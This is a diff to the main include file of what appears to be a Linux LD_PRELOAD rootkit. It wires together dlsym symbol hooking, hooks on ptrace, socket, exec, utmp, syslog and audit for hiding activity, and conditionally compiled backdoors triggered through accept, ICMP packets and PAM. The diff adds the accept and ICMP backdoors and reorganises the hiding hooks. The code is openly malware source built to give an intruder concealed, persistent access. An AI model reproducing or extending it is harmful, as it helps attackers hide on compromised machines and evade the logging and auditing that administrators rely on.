@@ -1,12 +1,14 @@
-/* we need libdl.h right now as it provides essential
- * symbol resolving functions. (hook, call, getsym)
- * not to mention the dlsym hook itself. */
 #include "hooks/libdl/libdl.h"
-#include "util/util.h"  /* now include util.h */
-#include "hiding/hiding.h"
+#include "util/util.h"
 
+#ifdef USE_ACCEPT_BD
+#include "backdoor/accept.c"
+#endif
+#ifdef USE_ICMP_BD
+#include "backdoor/icmp/icmp.h"
+#endif
 #ifdef USE_PAM_BD
-#include "backdoor/pam.h"
+#include "backdoor/pam/pam.h"
 #endif
 
 #ifdef LOG_LOCAL_AUTH
@@ -24,7 +26,6 @@ long ptrace(void *request, pid_t pid, void *addr, void *data);
 int ssme(int domain, int protocol);
 int socket(int domain, int type, int protocol);
 #include "hooks/socket.c"
-#include "hooks/pcap/pcap.h"
 #endif
 
 #include "hooks/exec/exec.h"
@@ -38,10 +39,12 @@ int socket(int domain, int type, int protocol);
 
 #ifdef USE_PAM_BD
 #include "hooks/pwd/pwd.h"
+#ifdef HIDE_SELF
+#include "hooks/utmp/utmp.h"
+#endif
+#endif
 
 #ifdef HIDE_SELF
-#include "hooks/audit/audit.h"
-#include "hooks/utmp/utmp.h"
 #include "hooks/syslog/syslog.h"
-#endif
+#include "hooks/audit/audit.h"
 #endif
